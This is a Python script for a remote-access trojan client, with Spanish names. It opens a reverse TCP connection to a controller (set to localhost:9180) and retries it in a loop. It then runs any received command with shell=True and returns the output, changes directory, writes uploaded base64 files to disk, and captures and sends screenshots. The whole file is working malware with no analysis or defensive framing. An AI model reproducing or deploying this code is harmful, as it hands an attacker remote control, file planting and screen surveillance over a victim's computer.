import socket
import subprocess
import os
import base64
import mss
import time

def upserver():
    global cliente
    cliente=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cliente.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    connection()


def connection():
    while True:
        time.sleep(5)
        try:            
            print ("conectado")            
            cliente.connect(("localhost",9180)) 
            shell()                   
        except:
            upserver()            
            #connection()

def captura_pantalla():
    screen=mss.mss()
    screen.shot()

def shell():      
    while True:        
        comandoBytes=cliente.recv(1024)
        comandodeco=comandoBytes.decode("utf8")
        if comandodeco=="exit":            
            #cliente.close()                     
            break           
        elif(comandodeco[:2]=="cd"):
            os.chdir(comandodeco[3:])
            comandodecoult=os.getcwd()
            cliente.send(str.encode(comandodecoult))
        elif(comandodeco[:6]=="upload"):                          
                with open(comandodeco[7:],"wb")as file_upload:
                    datos=cliente.recv(10000000)
                    file_upload.write(base64.b64decode(datos))  
        elif(comandodeco[:10]=="screenshot"):
            try:
                captura_pantalla()
                with open("monitor-1.png","rb")as file_send:
                    cliente.send(base64.b64encode(file_send.read()))
                os.remove("monitor-1.png")
            except:
                cliente.send(base64.b64decode('fail'))
        else:      
            comando=subprocess.Popen(comandodeco,stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            cliente.send(comando.stdout.read())
            cliente.send(comando.stderr.read())

upserver()
connection()

cliente.close()
   

